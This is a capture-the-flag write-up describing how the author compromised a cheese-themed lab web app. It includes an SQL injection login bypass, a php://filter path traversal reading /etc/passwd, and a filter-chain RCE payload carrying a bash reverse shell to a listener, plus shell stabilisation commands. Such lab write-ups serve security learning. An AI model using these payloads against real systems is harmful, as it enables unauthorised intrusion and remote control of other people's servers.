# Cheese CTF

### Flags

The website is about cheese: <br />
![image](https://github.com/user-attachments/assets/6570b944-15be-45be-b26f-cd57fa11a286)<br />
After moving a bit through the website and some basic enumeration, the only page that seems to be an entry point is the login page: <br />
![image](https://github.com/user-attachments/assets/3216996f-0906-4195-a5cc-c0f725089dfd)<br />
I started trying some basic SQL Injection techniques such as 'or 1=1--, but it didn't work. I even tried to use `sqlmap` but nothing, so I went back to manual enumeration. So, after one frustrating hour of trial and error, I was able to log in with the payload `' || 1=1;-- -`.<br />
The main thing that I learned with this is that, depending on the database, `||` substitutes `or`, and that it is a good practice to insert one more dash `-` to make sure that the comment symbol `--` gets parsed correctly. <br />
I am now inside an admin panel:<br />
![image](https://github.com/user-attachments/assets/7586859f-336d-46f6-8534-d2eeb665a90f)<br />
Moving a bit in the panel, I'm noticing some strange URLs:<br />
![image](https://github.com/user-attachments/assets/dc7e0d10-0957-4fca-b619-f2d165985e53)<br />
The server is using a **PHP wrapper filter**, which is a technique used to correctly read contents of a given file, even if it is encoded somehow. The first thing that came to my mind is to check for a path traversal vulnerability. So i used the following URL: `http://10.10.207.231/secret-script.php?file=php://filter/resource=../../../../../../../etc/passwd`, and it worked:<br />
![image](https://github.com/user-attachments/assets/773e114a-7848-498b-a85a-6b7329044952)<br />
Next, i tried to perform a RFI(Remote File inclusion) attack, by opening a web server on my machine and using the following URL: `10.10.207.231/secret-script.php?file=php://filter/resource=http://10.11.108.100/test.txt`. But it didn't work.
After some online search I found [this](https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md) github repo showing how to generate a php://filter payload for RCE. I copied the code in a file named `test.py` and used the following command to create a reverse shell payload: <br />
`python3 test.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.11.108.100/4444 0>&1\"'); ?>"`. <br />
So i copied the payload starting from "php://...." and put it inside the URL. So the final URL looked something like: `http://10.10.38.241/secret-script.php?file=php://filter/convert.iconv.UTF8......`. After opening a netcat listener, I got remote access(flags can be found at the end of this writeup):<br />
![image](https://github.com/user-attachments/assets/48cdd9d4-f15c-4921-ba9f-7e87c882d241)<br />
Now let's stabilize the shell:

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    CTRL+Z
    stty raw -echo; fg
    export TERM=xterm


- What is the user.txt flag? 
- What is the root.txt flag?
